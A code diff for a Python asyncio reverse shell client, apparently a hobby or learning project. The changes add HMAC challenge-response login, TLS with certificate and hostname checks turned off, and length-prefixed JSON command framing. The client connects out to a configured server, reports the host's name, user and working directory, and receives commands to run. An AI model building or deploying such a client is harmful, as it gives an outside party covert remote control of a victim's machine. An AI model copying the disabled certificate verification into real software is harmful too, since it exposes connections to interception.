@@ -1,8 +1,12 @@
 import asyncio
+import getpass
+import hashlib
+import hmac
+import ssl
 import json
 import os
 import struct
-from asyncio import CancelledError
+from asyncio import CancelledError, IncompleteReadError
 from pathlib import Path
 from sysInfo import TargetSysInfo
 
@@ -20,16 +24,50 @@ class ReverseShellClient:
         self.reader = None
         self.writer = None
         self.current_directory = os.getcwd()
-        self.clientinfo = TargetSysInfo()
+        self.client_info = TargetSysInfo()
+
+    async def perform_hmac_authentication(self) -> bool:
+        """
+        Performs client-side HMAC-based challenge-response authentication.
+
+        Steps:
+        1. Waits to receive a random challenge from the server.
+        2. Prompts the user to enter their shared secret (password).
+        3. Computes HMAC using the shared secret and received challenge.
+        4. Sends the HMAC back to the server.
+        5. Waits for server response indicating success ("accept") or failure.
+
+        Returns:
+            True if the server accepts the authentication, False otherwise.
+        """
+        # Step 1: Receive the challenge from the server
+        challenge = await self.reader.read(1024)
+
+        # Step 2: Prompt the user for the shared secret
+        shared_secret = getpass.getpass("Enter shared secret: ").encode()
+
+        # Step 3: Compute HMAC of the challenge using the secret
+        hmac_response = hmac.new(shared_secret, challenge, hashlib.sha256).digest()
+
+        # Step 4: Send the computed HMAC to the server
+        self.writer.write(hmac_response)
+        await self.writer.drain()
+
+        # Step 5: Wait for server confirmation
+        header = await self.reader.readexactly(4)
+        length = struct.unpack(">I", header)[0]
+        server_reply = await self.reader.read(length)
+        server_reply = json.loads(server_reply)
+        return server_reply['status'] == 'accept'
 
     def setup_data(self, stdout: str, stderr: str = '', dtype: str = '') -> bytes:
         data = {
             'stdout': stdout,
             'stderr': stderr,
             'type': dtype,
-            'cwd': self.clientinfo.cwd,
-            'hostname': self.clientinfo.hostname,
-            'username': self.clientinfo.username
+            'cwd': self.client_info.cwd,
+            'hostname': self.client_info.hostname,
+            'username': self.client_info.username
         }
         return json.dumps(data, indent=4).encode()
 
@@ -72,22 +110,35 @@ class ReverseShellClient:
         Connects to the reverse shell server and listens for commands to execute.
         """
         try:
-            self.reader, self.writer = await asyncio.open_connection(SERVER_HOST, SERVER_PORT)
+            ssl_ctx = ssl.create_default_context()
+            ssl_ctx.check_hostname = False
+            ssl_ctx.verify_mode = ssl.CERT_NONE
+            self.reader, self.writer = await asyncio.open_connection(SERVER_HOST,
+                                                                     SERVER_PORT,
+                                                                     ssl=ssl_ctx
+                                                                     )
+            auth = await self.perform_hmac_authentication()
+            if not auth:
+                print(f"[-] Connection refused by {SERVER_HOST}:{SERVER_PORT}")
+                return None
             print(f"[+] Connected to reverse shell server at {SERVER_HOST}:{SERVER_PORT}")
-            await self.send_output(self.setup_data(stdout=self.clientinfo.__str__()).strip())
+            await self.send_output(self.setup_data(stdout=self.client_info.__str__()).strip())
 
             while True:
                 # Receive a command from the server
-                data = await self.reader.read(1024)
-                if not data:
+                header = await self.reader.readexactly(4)
+                length = struct.unpack(">I", header)[0]
+                data = await self.reader.read(length)
+                command = json.loads(data)['cmd']
+
+                if not command:
                     print(f"[-] Connection closed by {SERVER_HOST}:{SERVER_PORT}")
                     self.writer.close()
                     await self.writer.wait_closed()
                     break
-                command = data.decode().strip()
 
                 if command == "sysinfo":
-                    await self.send_output(self.setup_data(stdout=self.clientinfo.__str__()))
+                    await self.send_output(self.setup_data(stdout=self.client_info.__str__()))
                     continue
 
                 try:
@@ -119,6 +170,8 @@ class ReverseShellClient:
             # do something
         except ConnectionResetError as e:
             print(e)
+        except IncompleteReadError as e:
+            print(f"[-] Connection closed by {SERVER_HOST}:{SERVER_PORT}")
 
 
 async def main():
